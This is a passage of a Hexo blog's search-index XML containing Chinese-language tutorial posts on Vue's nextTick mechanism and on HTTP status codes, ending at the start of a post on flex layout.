<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>nexttick</title>
    <link href="/hexo_blog/2021/10/08/nextTick/"/>
    <url>/hexo_blog/2021/10/08/nextTick/</url>
    
    <content type="html"><![CDATA[<h1 id="nexttick-sailboat"><a href="#nexttick-sailboat" class="headerlink" title="nexttick :sailboat:"></a>nexttick :sailboat:</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>nextTick可以让我们在下次 DOM 更新循环结束之后执行延迟回调，用于获得更新后的 DOM</p><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><p>这里主线程的执行过程就是一个<code>tick</code>，而所有的异步结果都是通过任务队列来调度。<code>Event Loop</code> 分为宏任务和微任务，无论是执行宏任务还是微任务，完成后都会进入到一下<code>tick</code>，<strong>并在两个<code>tick</code>之间进行UI渲染</strong>。</p><p>由于Vue DOM更新是异步执行的，即修改数据时，视图不会立即更新，而是会监听数据变化，并缓存在同一事件循环中，等同一数据循环中的所有数据变化完成之后，再统一进行视图更新。为了确保得到更新后的DOM，所以设置了 <code>Vue.nextTick()</code>方法。</p><ul><li>在 <code>Vue 2.4</code> 之前都是使用的 <code>microtasks</code>，但是<code>microtasks</code> 的优先级过高，在某些情况下可能会出现比事件冒泡更快的情况，但如果都使用 <code>macrotasks</code> 又可能会出现渲染的性能问题。所以在新版本中，会默认使用 <code>microtasks</code>，但在特殊情况下会使用 <code>macrotasks</code>，比如 <code>v-on</code>。</li><li>对于实现 <code>macrotasks</code> ，会先判断是否能使用 <code>setImmediate</code> ，不能的话降级为 <code>MessageChannel</code> ，以上都不行的话就使用 <code>setTimeout</code></li></ul><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> setImmediate !== <span class="hljs-string">&#x27;undefined&#x27;</span> &amp;&amp; isNative(setImmediate)) &#123;  macroTimerFunc = <span class="hljs-function">() =&gt;</span> &#123;    setImmediate(flushCallbacks)  &#125;&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (  <span class="hljs-keyword">typeof</span> MessageChannel !== <span class="hljs-string">&#x27;undefined&#x27;</span> &amp;&amp;  (isNative(MessageChannel) ||    <span class="hljs-comment">// PhantomJS</span>    MessageChannel.toString() === <span class="hljs-string">&#x27;[object MessageChannelConstructor]&#x27;</span>)) &#123;  <span class="hljs-keyword">const</span> channel = <span class="hljs-keyword">new</span> MessageChannel()  <span class="hljs-keyword">const</span> port = channel.port2  channel.port1.onmessage = flushCallbacks  macroTimerFunc = <span class="hljs-function">() =&gt;</span> &#123;    port.postMessage(<span class="hljs-number">1</span>)  &#125;&#125; <span class="hljs-keyword">else</span> &#123;  macroTimerFunc = <span class="hljs-function">() =&gt;</span> &#123;    <span class="hljs-built_in">setTimeout</span>(flushCallbacks, <span class="hljs-number">0</span>)  &#125;&#125;</code></pre></div><h2 id="应用场景："><a href="#应用场景：" class="headerlink" title="应用场景："></a>应用场景：</h2><ul><li><p>在Vue生命周期的</p><div class="hljs code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">created</span><span class="hljs-params">()</span></span></code></pre></div><p>钩子函数进行的DOM操作一定要放在</p><div class="hljs code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Vue</span>.</span></span>next<span class="hljs-constructor">Tick()</span></code></pre></div><p>的回调函数中。</p><p><strong>原因</strong>：是<code>created()</code>钩子函数执行时DOM其实并未进行渲染。</p></li><li><p>在数据变化后要执行的某个操作，而这个操作需要使用随数据改变而改变的DOM结构的时候，这个操作应该放在</p><div class="hljs code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Vue</span>.</span></span>next<span class="hljs-constructor">Tick()</span></code></pre></div><p>的回调函数中。</p><p><strong>原因</strong>：Vue异步执行DOM更新，只要观察到数据变化，Vue将开启一个队列，并缓冲在同一事件循环中发生的所有数据改变，如果同一个watcher被多次触发，只会被推入到队列中一次。</p></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>使用<code>Vue.nextTick()</code>是为了可以获取更新后的DOM 。<br>触发时机：在同一事件循环中的数据变化后，DOM完成更新，立即执行<code>Vue.nextTick()</code>的回调。</p><blockquote><p>同一事件循环中的代码执行完毕 -&gt; DOM 更新 -&gt; nextTick callback触发</p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网络状态码</title>
    <link href="/hexo_blog/2021/10/07/%E8%AF%B7%E6%B1%82%E7%8A%B6%E6%80%81%E7%A0%81/"/>
    <url>/hexo_blog/2021/10/07/%E8%AF%B7%E6%B1%82%E7%8A%B6%E6%80%81%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h1 id="网络状态码"><a href="#网络状态码" class="headerlink" title="网络状态码"></a>网络状态码</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>http状态码的由三位数字和原因短语组成，数字的第一位数字表示响应的类别，后面两位无类别。以下有五种类别。另外只要遵循状态码类别的定义，即使改变RFC2616中定义的状态码，或者服务端自行创建状态码都可以。</p><p>1XX</p><ul><li>类别：informational 信息性状态码</li><li>原因短语：接收的请求正在处理</li></ul><p>2XX</p><ul><li>类别：success 成功状态码</li><li>原因短语：请求正常处理完毕</li></ul><p>3XX</p><ul><li>类别：redirection 重定向状态码</li><li>原因短语：需要进行附加操作以完成请求</li></ul><p>4XX</p><ul><li>类别：client error 客户端错误状态码</li><li>原因短语：服务器无法处理请求</li></ul><p>5XX</p><ul><li>类别：server error 服务器错误状态码</li><li>原因短语：服务器处理请求出错</li></ul><h2 id="常见状态"><a href="#常见状态" class="headerlink" title="常见状态"></a>常见状态</h2><h2 id="1xx-Informational-信息响应"><a href="#1xx-Informational-信息响应" class="headerlink" title="1xx Informational 信息响应"></a>1xx Informational 信息响应</h2><p>1XX 是信息响应，表示接收的请求正在被处理。</p><h3 id="100-Continue-（继续）"><a href="#100-Continue-（继续）" class="headerlink" title="100 Continue （继续）"></a>100 Continue （继续）</h3><ul><li>响应结果：信息型状态响应码表示目前为止一切正常, 客户端应该继续请求, 如果已完成请求则忽略.</li><li>使用场景：为了让服务器检查请求的首部, 客户端必须在发送请求实体前, 在初始化请求中发送 Expect: 100-continue 首部并接收 100 Continue 响应状态码.</li></ul><h3 id="101-Switching-Protocols-（协议切换）"><a href="#101-Switching-Protocols-（协议切换）" class="headerlink" title="101 Switching Protocols （协议切换）"></a>101 Switching Protocols （协议切换）</h3><ul><li><p>响应结果：表示服务器应客户端升级协议的请求（Upgrade请求头）正在进行协议切换。服务器会发送一个Upgrade响应头来表示其正在切换过去的协议。</p></li><li><p>使用场景：</p><p>在使用 WebSockets 时会用到协议切换。</p></li></ul><h2 id="2xx-Successful-成功响应"><a href="#2xx-Successful-成功响应" class="headerlink" title="2xx Successful 成功响应"></a>2xx Successful 成功响应</h2><p>2XX 表示请求被正常处理了。</p><h3 id="200-OK-（成功）"><a href="#200-OK-（成功）" class="headerlink" title="200 OK （成功）"></a>200 OK （成功）</h3><ul><li>响应结果：请求成功，表示客户端发来的请求在服务端被正常处理了。</li><li>不同的请求方法对请求成功的意义不同：</li><li><ul><li>GET方法请求时，对应的请求资源实体会作为响应返回；</li></ul></li><li><ul><li>HEAD方法请求时，对应请求资源的实体首部不随报文主体作为响应返回，即响应中只返回首部，不返回实体的主体部分；</li></ul></li><li><ul><li>POST方法请求时，响应的消息体重包含请求的结果</li></ul></li></ul><h3 id="201-Created-（已创建）"><a href="#201-Created-（已创建）" class="headerlink" title="201 Created （已创建）"></a>201 Created （已创建）</h3><ul><li>响应结果：该请求已成功，并因此创建了一个新的资源。</li><li>使用场景：作为PUT请求的返回值。</li></ul><h3 id="202-Accepted（已接受）"><a href="#202-Accepted（已接受）" class="headerlink" title="202 Accepted（已接受）"></a>202 Accepted（已接受）</h3><ul><li>响应结果：服务端收到请求，但未处理。</li><li>使用场景：这个状态码被设计用来将请求交由另外一个进程或者服务器来进行处理，或者是对请求进行批处理的情形。</li></ul><h3 id="203-Non-Authoritative-Information（非权威信息）"><a href="#203-Non-Authoritative-Information（非权威信息）" class="headerlink" title="203 Non-Authoritative Information（非权威信息）"></a>203 Non-Authoritative Information（非权威信息）</h3><ul><li>响应结果：服务器已成功处理了请求，但返回的实体头部元信息不是在原始服务器上有效的确定集合，而是来自本地或者第三方的拷贝。当前的信息可能是原始版本的子集或者超集。</li><li>使用场景：通过代理访问原始服务器的时候，成功获取了原始服务器（状态码200）的返回内容，但是代理对内容作出了一些改动，代理会通过这个状态码告知用户，成功获取内容，但是这部分内容和原始服务器的返回内容可能不完全一致。</li></ul><h3 id="204-No-Content-没有内容"><a href="#204-No-Content-没有内容" class="headerlink" title="204 No Content (没有内容)"></a>204 No Content (没有内容)</h3><ul><li>响应结果：服务器成功处理了客户端请求，但服务器无返回内容。204是HTTP中数据量最少的响应状态，204的响应中没有body，而且Content-Length=0。</li><li>使用场景：204状态在一些网站分析的代码中最常用到，只需要把客户端的一些信息提交给服务器而无需关心响应。</li></ul><h3 id="205-Reset-Content-重置内容"><a href="#205-Reset-Content-重置内容" class="headerlink" title="205 Reset Content (重置内容)"></a>205 Reset Content (重置内容)</h3><ul><li>响应结果：服务器成功处理了请求，且没有返回任何内容。但是与204响应不同，返回此状态码的响应要求请求者重置文档视图。</li><li>使用场景：用来通知客户端重置文档视图，比如清空表单内容、重置 canvas 状态或者刷新用户界面。</li></ul><h3 id="206-Partial-Content-（部分内容）"><a href="#206-Partial-Content-（部分内容）" class="headerlink" title="206 Partial Content （部分内容）"></a>206 Partial Content （部分内容）</h3><ul><li>响应结果：表示客户端进行了范围请求，而服务器成功执行了这部分GET请求。响应报文中包含由Content-Range指定范围的实体内容。</li><li>使用场景：类似于 FlashGet 或者迅雷这类的 HTTP 下载工具都是使用此类响应实现断点续传或者将一个大文档分解为多个下载段同时下载。该请求必须包含 Range 头信息来指示客户端希望得到的内容范围，并且可能包含 If-Range 来作为请求条件</li></ul><h2 id="3xx-Redirection-重定向"><a href="#3xx-Redirection-重定向" class="headerlink" title="3xx Redirection 重定向"></a>3xx Redirection 重定向</h2><p>3XX响应结果表明浏览器需要执行某些特殊的处理以正确的处理请求。</p><h3 id="300-Multiple-Choices-（多项选择）"><a href="#300-Multiple-Choices-（多项选择）" class="headerlink" title="300 Multiple Choices （多项选择）"></a>300 Multiple Choices （多项选择）</h3><ul><li>响应结果：是一个用来表示重定向的响应状态码，表示该请求拥有多种可能的响应。用户代理或者用户自身应该从中选择一个。</li><li>使用场景：由于没有如何进行选择的标准方法，这个状态码极少使用。</li></ul><h3 id="301-Moved-Permanently（永久性重定向"><a href="#301-Moved-Permanently（永久性重定向" class="headerlink" title="301 Moved Permanently（永久性重定向)"></a>301 Moved Permanently（永久性重定向)</h3><ul><li>响应结果：表示请求的资源已被分配了新的URL，以后应使用现在所指的URL。也就是说如果已经吧资源对应的URL保存为书签了，这时应该按Location首部字段提示的URL重新保存。</li><li>使用场景：</li><li><ul><li>域名到期不想续费（或者发现了更适合网站的域名），想换个域名。</li></ul></li><li><ul><li>在搜索引擎的搜索结果中出现了不带www的域名，而带www的域名却没有收录，这个时候可以用301重定向来告诉搜索引擎我们目标的域名是哪一个。</li></ul></li><li><ul><li>空间服务器不稳定，换空间的时候。</li></ul></li></ul><h3 id="302-Found（临时性重定向）"><a href="#302-Found（临时性重定向）" class="headerlink" title="302 Found（临时性重定向）"></a>302 Found（临时性重定向）</h3><ul><li>响应结果：该状态码表示请求的资源已被分配了新的URL，希望用户（本次）能使用新的URL访问。</li><li>使用场景：尽量使用301！</li></ul><h3 id="303-See-Other（参见其他）"><a href="#303-See-Other（参见其他）" class="headerlink" title="303 See Other（参见其他）"></a>303 See Other（参见其他）</h3><ul><li>响应结果：表示由于请求对应的资源存在这另一个URL，应使用GET方法定向获取请求的资源。303与302不同之处在于，302是不会改变请求的方法，如果请求方法是POST的话，重定向的请求也应该是POST。而对于303，使用POST请求的话，重定向的请求应该是GET请求。</li><li>使用场景：未知。</li></ul><h3 id="304-Not-Modified（未修改）"><a href="#304-Not-Modified（未修改）" class="headerlink" title="304 Not Modified（未修改）"></a>304 Not Modified（未修改）</h3><p>响应结果：该状态码表示客户端发送附带条件的请求（指采用GET方法的请求报文中包含）时，服务器端允许请求访问资源，但未满足条件的情况。304状态码返回时，不包含任何响应的主体。304虽然在3xx类别中，但是和重定向没关系。</p><ul><li>使用场景：在 Web 页面中查看任务详情时，要求能够不刷新页面便自动的更新它的状态与日志等信息（任务的执行会花费一定的时间，同时后台在处理任务的过程中会同步它的状态与日志的更新）。因为任务的状态更新可接受短暂的延时，所以不必采用长连接的方式，客户端只需要定时往服务器发送获取数据的请求即可，但是任务的数据量较大，如果任务并未发生改变，就查询它全部的相关信息并返回到客户端对性能而言必然不是最优的选择，所以我们需要在它发生改变后才查询并返回数据，那么这里就可以引入 304 状态码来解决任务无变化时的返回结果。</li></ul><h3 id="305-Use-Proxy-（使用代理）"><a href="#305-Use-Proxy-（使用代理）" class="headerlink" title="305 Use Proxy （使用代理）"></a>305 Use Proxy （使用代理）</h3><ul><li>响应结果：被请求的资源必须通过指定的代理才能被访问。</li><li>使用场景：未知。</li></ul><h3 id="306-Unused"><a href="#306-Unused" class="headerlink" title="306 (Unused)"></a>306 (Unused)</h3><p>在最新版的规范中，306状态码已经不再被使用。</p><h3 id="307-Temporary-Redirect-（临时重定向）"><a href="#307-Temporary-Redirect-（临时重定向）" class="headerlink" title="307 Temporary Redirect （临时重定向）"></a>307 Temporary Redirect （临时重定向）</h3><ul><li>响应结果：该状态码与302有着相同的含义。尽管302标准禁止POST变换成GET，但实际使用时大家并不遵守。307会遵照浏览器标准，不会从POST变成GET。但是，对于处理响应时的行为，每种浏览器有可能出现不同的情况。</li><li>使用场景：同302</li></ul><h3 id="308-Permanent-Redirect（永久重定向）"><a href="#308-Permanent-Redirect（永久重定向）" class="headerlink" title="308 Permanent Redirect（永久重定向）"></a>308 Permanent Redirect（永久重定向）</h3><ul><li>响应结果：是表示重定向的响应状态码，说明请求的资源已经被永久的移动到了由 Location 首部指定的 URL 上。浏览器会进行重定向，同时搜索引擎也会更新其链接（用 SEO 的行话来说，意思是链接汁被传递到了新的 URL）。在重定向过程中，请求方法和消息主体不会发生改变，然而在返回 301 状态码的情况下，请求方法有时候会被客户端错误地修改为 GET 方法。</li><li>使用场景：一些 Web 应用可能会将 308 Permanent Redirect 以一种非标准的方式使用以及用作其他用途。例如，Google Drive 会使用 308 Resume Incomplete 状态码来告知客户端文件上传终止且不完整。</li></ul><h2 id="4xx-Client-Error客户端响应"><a href="#4xx-Client-Error客户端响应" class="headerlink" title="4xx Client Error客户端响应"></a>4xx Client Error客户端响应</h2><p>4XX的响应结果表明客户端是发生错误的原因所在。</p><h3 id="400-Bad-Request（坏请求）"><a href="#400-Bad-Request（坏请求）" class="headerlink" title="400 Bad Request（坏请求）"></a>400 Bad Request（坏请求）</h3><ul><li>响应结果：该状态码表示请求报文中存在语法错误。当错误发生时，需要修改请求的内容后再次发送请求。另外，浏览器会像200OK一样对待该状态码。</li><li>出现原因：语义有误，当前请求无法被服务器理解。除非进行修改，否则客户端不应该重复提交这个请求。请求参数有误。</li></ul><h3 id="401-Unauthorized（未授权）"><a href="#401-Unauthorized（未授权）" class="headerlink" title="401 Unauthorized（未授权）"></a>401 Unauthorized（未授权）</h3><p>-响应结果：表示发送的请求需要有通过HTTP认证的认证信息。另外若之前已进行过一次请求，则表示用户认证失败。返回含有401响应必须包含一个适用于被请求资源的WWW-Authenticate 首部用以质询用户信息。当浏览器初次接收到401响应，会弹出认证用的对话窗口。</p><ul><li>出现原因：客户端错误，指的是由于缺乏目标资源要求的身份验证凭证，发送的请求未得到满足。</li></ul><h3 id="402-Payment-Required（要求付款）"><a href="#402-Payment-Required（要求付款）" class="headerlink" title="402 Payment Required（要求付款）"></a>402 Payment Required（要求付款）</h3><ul><li>响应结果：此响应码保留以便将来使用，创造此响应码的最初目的是用于数字支付系统，然而现在并未使用。</li></ul><h3 id="403-Forbidden-（禁止）"><a href="#403-Forbidden-（禁止）" class="headerlink" title="403 Forbidden （禁止）"></a>403 Forbidden （禁止）</h3><ul><li>响应结果：对请求资源的访问服务器拒绝了。服务器端没有必要给出拒绝的详细理由，但如果想作说明的话，可以在实体的主题部分对原因进行描述，这样就能让用户看到了。</li><li>出现原因：未获得文件系统的访问授权，访问权限出现某些问题（从未授权的发送源IP地址试图访问）等列举情况都可能是发生403的原因。</li></ul><h3 id="404-Not-Found（未找到）"><a href="#404-Not-Found（未找到）" class="headerlink" title="404 Not Found（未找到）"></a>404 Not Found（未找到）</h3><ul><li>响应结果：表明服务器上无法找到请求的资源。</li><li>使用场景：服务器找不到资源时，或者服务器拒绝请求又不想说明理由时。</li></ul><h3 id="405-Method-Not-Allowed（不允许使用的方法）"><a href="#405-Method-Not-Allowed（不允许使用的方法）" class="headerlink" title="405 Method Not Allowed（不允许使用的方法）"></a>405 Method Not Allowed（不允许使用的方法）</h3><ul><li>响应结果：请求行中指定的请求方法不能被用于请求相应的资源。该响应必须返回一个Allow 头信息用以表示出当前资源能够接受的请求方法的列表。</li><li>出现原因：鉴于 PUT，DELETE 方法会对服务器上的资源进行写操作，因而绝大部分的网页服务器都不支持或者在默认配置下不允许上述请求方法，对于此类请求均会返回405错误。</li></ul><h3 id="406-Not-Acceptable（无法接受）"><a href="#406-Not-Acceptable（无法接受）" class="headerlink" title="406 Not Acceptable（无法接受）"></a>406 Not Acceptable（无法接受）</h3><ul><li>响应结果：表示客户端错误，指代服务器端无法提供与 Accept-Charset 以及 Accept-Language 消息头指定的值相匹配的响应</li><li>出现原因：在实际应用中，这个错误状态码极少使用：不是给用户返回一个晦涩难懂（且难以更正）的错误状态码，而是将相关的消息头忽略，同时给用户提供一个看得见摸得着的页面。这种做法基于这样一个假设：即便是不能达到用户十分满意，也强于返回错误状态码。</li></ul><p>如果服务器返回了这个错误状态码，那么消息体中应该包含所能提供的资源表现形式的列表，允许用户手动进行选择。</p><h3 id="407-Proxy-Authentication-Required-要求进行代理认证"><a href="#407-Proxy-Authentication-Required-要求进行代理认证" class="headerlink" title="407 Proxy Authentication Required(要求进行代理认证)"></a>407 Proxy Authentication Required(要求进行代理认证)</h3><ul><li>响应结果：代表客户端错误，指的是由于缺乏位于浏览器与可以访问所请求资源的服务器之间的代理服务器（proxy server ）要求的身份验证凭证，发送的请求尚未得到满足。</li><li>使用场景：这个状态码会与 Proxy-Authenticate 首部一起发送，其中包含有如何进行验证的信息。</li></ul><h3 id="408-Request-Timeout（请求超时）"><a href="#408-Request-Timeout（请求超时）" class="headerlink" title="408 Request Timeout（请求超时）"></a>408 Request Timeout（请求超时）</h3><ul><li>响应结果：遇到408意味着你的请求发送到该网站花的时间比该网站的服务器准备等待的时间要长，即链接超时。408错误往往难以解决，通常涉及系统工作量或系统操作中的一次性变化。</li><li>出现原因：如果用户持续看到408错误，管理员首先要考虑到Web服务器的工作量，特别是在产生408错误的时间段，另外网络流量激增也可能导致用户无法访问网页从而出现该错误。</li></ul><h3 id="409-Conflict（冲突）"><a href="#409-Conflict（冲突）" class="headerlink" title="409 Conflict（冲突）"></a>409 Conflict（冲突）</h3><ul><li>响应结果：表示请求与当前服务器端的状态相冲突。</li><li>出现原因：冲突最有可能发生在对 PUT 请求的响应中。例如，当上传文件的版本比服务器上已存在的要旧，从而导致版本冲突的时候，那么就有可能收到状态码为 409 的响应。</li></ul><h3 id="410-Gone（消失了）"><a href="#410-Gone（消失了）" class="headerlink" title="410 Gone（消失了）"></a>410 Gone（消失了）</h3><ul><li>响应结果：说明请求的内容在服务器上不存在了，同时是永久性的丢失。如果不清楚是否为永久或临时的丢失，应该使用404 。</li></ul><h3 id="411-Length-Required（要求长度指示）"><a href="#411-Length-Required（要求长度指示）" class="headerlink" title="411 Length Required（要求长度指示）"></a>411 Length Required（要求长度指示）</h3><ul><li>响应结果：属于客户端错误，表示由于缺少确定的Content-Length 首部字段，服务器拒绝客户端的请求。</li></ul><h3 id="412-Precondition-Failed（先决条件失败）"><a href="#412-Precondition-Failed（先决条件失败）" class="headerlink" title="412 Precondition Failed（先决条件失败）"></a>412 Precondition Failed（先决条件失败）</h3><ul><li>响应结果:（先决条件失败）表示客户端错误，意味着对于目标资源的访问请求被拒绝。</li><li>出现场景：这通常发生于采用除 GET 和 HEAD 之外的方法进行条件请求时，由首部字段 If-Unmodified-Since 或 If-None-Match 规定的先决条件不成立的情况下。这时候，请求的操作——通常是上传或修改文件——无法执行，从而返回该错误状态码。</li></ul><h3 id="413-Payload-Too-Large（请求实体太大）"><a href="#413-Payload-Too-Large（请求实体太大）" class="headerlink" title="413 Payload Too Large（请求实体太大）"></a>413 Payload Too Large（请求实体太大）</h3><ul><li>响应结果：表示请求主体的大小超过了服务器规定的限度，服务器可以选择关闭连接或者返回 Retry-After 首部字段。</li></ul><h3 id="414-URI-Too-Long（请求URI太长）"><a href="#414-URI-Too-Long（请求URI太长）" class="headerlink" title="414 URI Too Long（请求URI太长）"></a>414 URI Too Long（请求URI太长）</h3><ul><li>响应结果：表示客户端所请求的 URI 超过了服务器允许的范围。</li><li>出现原因：</li><li><ul><li>当客户端误将 POST 请求当作 GET 请求的时候，会带有一个常常的查询字符串(query)；</li></ul></li><li><ul><li>when the client has descended into a loop of redirection (for example, a redirected URI prefix that points to a suffix of itself)</li></ul></li><li><ul><li>当客户端对服务器进行攻击，试图寻找潜在的漏洞的时候。</li></ul></li></ul><h3 id="415-Unsupported-Media-Type（不支持的媒体类型）"><a href="#415-Unsupported-Media-Type（不支持的媒体类型）" class="headerlink" title="415 Unsupported Media Type（不支持的媒体类型）"></a>415 Unsupported Media Type（不支持的媒体类型）</h3><ul><li>响应结果：是一种HTTP协议的错误状态代码，表示服务器由于不支持其有效载荷的格式，从而拒绝接受客户端的请求。</li><li>出现原因：格式问题的出现有可能源于客户端在 Content-Type 或 Content-Encoding 首部中指定的格式，也可能源于直接对负载数据进行检测的结果。</li></ul><h3 id="416-Requested-Range-Not-Satisfiable-（所请求的范围未得到满足）"><a href="#416-Requested-Range-Not-Satisfiable-（所请求的范围未得到满足）" class="headerlink" title="416 Requested Range Not Satisfiable （所请求的范围未得到满足）"></a>416 Requested Range Not Satisfiable （所请求的范围未得到满足）</h3><ul><li>响应结果：服务器无法处理所请求的数据区间，最常见的情况是所请求的数据区间不在文件范围之内。一则 416 应答消息包含有一个 Content-Range 首部，提示无法满足的数据区间（用星号 * 表示），后面紧跟着一个“/”，再后面是当前资源的长度。例如：</li></ul><p>遇到这一错误状态码的时候，浏览器一般有两种策略：一种是终止操作，例如，一项中断的下载操作被认为是不可恢复的；另外一种是再次请求整个文件。</p><h3 id="417-Expectation-Failed（无法满足期望）"><a href="#417-Expectation-Failed（无法满足期望）" class="headerlink" title="417 Expectation Failed（无法满足期望）"></a>417 Expectation Failed（无法满足期望）</h3><ul><li>响应结果：客户端错误，意味着服务器无法满足 Expect 请求消息头中的期望条件。</li></ul><h3 id="426-Upgrade-Required（需要升级）"><a href="#426-Upgrade-Required（需要升级）" class="headerlink" title="426 Upgrade Required（需要升级）"></a>426 Upgrade Required（需要升级）</h3><ul><li>响应结果：是一种HTTP协议的错误状态代码，表示服务器拒绝处理客户端使用当前协议发送的请求，但是可以接受其使用升级后的协议发送的请求。</li></ul><p>服务器会在响应中使用 Upgrade 首部来指定要求的协议。</p><h3 id="428-Precondition-Required（先决条件要求）"><a href="#428-Precondition-Required（先决条件要求）" class="headerlink" title="428 Precondition Required（先决条件要求）"></a>428 Precondition Required（先决条件要求）</h3><ul><li>响应结果：表示服务器端要求发送条件请求。</li><li>出现原因：一般的，这种情况意味着必要的条件首部——如 If-Match ——的缺失。.</li></ul><p>当一个条件首部的值不能匹配服务器端的状态的时候，应答的状态码应该是 412 Precondition Failed，前置条件验证失败。</p><h3 id="429-Too-Many-Requests（请求太多）"><a href="#429-Too-Many-Requests（请求太多）" class="headerlink" title="429 Too Many Requests（请求太多）"></a>429 Too Many Requests（请求太多）</h3><p>表示在一定的时间内用户发送了太多的请求，即超出了“频次限制”。</p><h3 id="431-Request-Header-Fields-Too-Large"><a href="#431-Request-Header-Fields-Too-Large" class="headerlink" title="431 Request Header Fields Too Large"></a>431 Request Header Fields Too Large</h3><ul><li>响应主体：表示在一定的时间内用户发送了太多的请求，即超出了“频次限制”。在响应中，可以提供一个 Retry-After 首部来提示用户需要等待多长时间之后再发送新的请求。</li></ul><h3 id="431-Request-Header-Fields-Too-Large-1"><a href="#431-Request-Header-Fields-Too-Large-1" class="headerlink" title="431 Request Header Fields Too Large"></a>431 Request Header Fields Too Large</h3><ul><li>响应主体：表示由于请求中的首部字段的值过大，服务器拒绝接受客户端的请求。客户端可以在缩减首部字段的体积后再次发送请求。</li><li>应用场景：该响应码可以用于首部总体体积过大的情况，也可以用于单个首部体积过大的情况。<br>这种错误不应该出现于经过良好测试的投入使用的系统当中，而是更多出现于测试新系统的时候</li></ul><h3 id="451-Unavailable-For-LegalReason（因法律原因不可用）"><a href="#451-Unavailable-For-LegalReason（因法律原因不可用）" class="headerlink" title="451 Unavailable For LegalReason（因法律原因不可用）"></a>451 Unavailable For LegalReason（因法律原因不可用）</h3><ul><li>响应结果：是一种HTTP协议的错误状态代码，表示服务器由于法律原因，无法提供客户端请求的资源，例如可能会导致法律诉讼的页面。</li></ul><h2 id="5xx-Server-Error-服务器错误"><a href="#5xx-Server-Error-服务器错误" class="headerlink" title="5xx Server Error 服务器错误"></a>5xx Server Error 服务器错误</h2><p>5XX 响应结果表明服务器本身发生错误。</p><h3 id="500-Internal-Server-Error（内部资源出错）"><a href="#500-Internal-Server-Error（内部资源出错）" class="headerlink" title="500 Internal Server Error（内部资源出错）"></a>500 Internal Server Error（内部资源出错）</h3><ul><li>响应结果：表明服务器端在执行请求时发生了错误。也有可能是Web应用存在的bug或某些临时的故障。</li><li>解决方案：这个错误代码是一个通用的“全方位”响应代码。通常服务器管理员对于类似于 500 这样的错误会更加详细地记录相关的请求信息来防止以后同样错误的出现。</li></ul><h3 id="501-Not-Implemented-服务器不支持"><a href="#501-Not-Implemented-服务器不支持" class="headerlink" title="501 Not Implemented(服务器不支持)"></a>501 Not Implemented(服务器不支持)</h3><ul><li>响应结果：服务器错误响应码表示请求的方法不被服务器支持，因此无法被处理。服务器必须支持的方法（即不会返回这个状态码的方法）只有 GET 和 HEAD。</li><li>解决方法：你无法修复 501 错误，需要被访问的 web 服务器去修复该问题。</li></ul><h3 id="502-Bad-Gateway-错误状态"><a href="#502-Bad-Gateway-错误状态" class="headerlink" title="502 Bad Gateway(错误状态)"></a>502 Bad Gateway(错误状态)</h3><ul><li>响应结果：是一种HTTP协议的服务器端错误状态代码，它表示扮演网关或代理角色的服务器，从上游服务器中接收到的响应是无效的。</li><li>解决方法：502 错误通常不是客户端能够修复的，而是需要由途径的Web服务器或者代理服务器对其进行修复。</li></ul><h3 id="503-Service-Unavailable-超负载"><a href="#503-Service-Unavailable-超负载" class="headerlink" title="503 Service Unavailable(超负载)"></a>503 Service Unavailable(超负载)</h3><ul><li>响应结果：表明服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。如果事先得知解除以上状况需要的视觉，最好写入Retry-After首部字段在返回给客户端。</li><li>出现原因：在服务器503错误出现了之后，大家不必担心的， 服务器或许就是正在维护或者暂停了，你可以联系一下服务器空间商。还有的时候cpu占用的频率大导致的。</li></ul><h3 id="504-Gateway-Timeout（网关超时）"><a href="#504-Gateway-Timeout（网关超时）" class="headerlink" title="504 Gateway Timeout（网关超时）"></a>504 Gateway Timeout（网关超时）</h3><ul><li>响应结果：与状态吗408类似， 但是响应来自网关或代理，此网关或代理在等待另一台服务器的响应时出现了超时</li></ul><h3 id="505-HTTP-Version-Not-Supported（不支持的HTTP版本）"><a href="#505-HTTP-Version-Not-Supported（不支持的HTTP版本）" class="headerlink" title="505 HTTP Version Not Supported（不支持的HTTP版本）"></a>505 HTTP Version Not Supported（不支持的HTTP版本）</h3><ul><li>响应结果：服务器收到的请求使用了它不支持的HTTP协议版本。 有些服务器不支持HTTP早期的HTTP协议版本，也不支持太高的协议版本</li></ul><h3 id="511-Network-Authentication-Required"><a href="#511-Network-Authentication-Required" class="headerlink" title="511 Network Authentication Required"></a>511 Network Authentication Required</h3><ul><li>响应结果：表示客户端需要通过验证才能使用该网络。该状态码不是由源头服务器生成的，而是由控制网络访问的拦截代理服务器生成的。</li><li>出现原因：网络运营商们有时候会在准许使用网络之前要求用户进行身份验证、接受某些条款，或者进行其他形式的与用户之间的互动（例如在网络咖啡厅或者机场）。他们通常用用户设备的 MAC 地址来进行识别。</li></ul><p>原文：<a href="https://futu.im/article/http-status-code/">https://futu.im/article/http-status-code/</a></p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>flex 布局</title>
    <link href="/hexo_blog/2021/10/06/flex/"/>
    <url>/hexo_blog/2021/10/06/flex/</url>
    
